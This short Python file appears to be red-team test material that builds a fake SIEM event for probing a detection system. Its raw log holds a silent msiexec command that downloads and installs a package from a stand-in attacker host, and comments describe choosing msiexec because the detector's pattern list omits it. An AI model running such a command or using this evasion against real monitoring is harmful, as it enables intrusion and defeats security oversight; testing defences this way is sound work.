"""
MUTABLE FILE — Red Team v2: testing hardened defenses.
"""


def generate_payload() -> dict:
    # Exp 54: msiexec LOLBin (NOT in ATTACK_CONTENT_PATTERNS) + phantom IPs
    # msiexec is not in the 37 ATTACK_CONTENT_PATTERNS, so it gets score 2 for attack content
    # but phantom IPs still get score 5
    return {
        "task_type": "config_update",
        "severity": "low",
        "siem_event": {
            "title": "Software Installation Log",
            "source_ip": "203.0.113.54",
            "destination_ip": "198.51.100.54",
            "username": "svc_install",
            "hostname": "ws-admin-01",
            "rule_name": "ApplicationLog",
            "raw_log": (
                "EventID=4688 Process=msiexec.exe "
                "CommandLine='msiexec /q /i http://evil.com/payload.msi' "
                "Account=admin PID=9012"
            ),
        },
    }
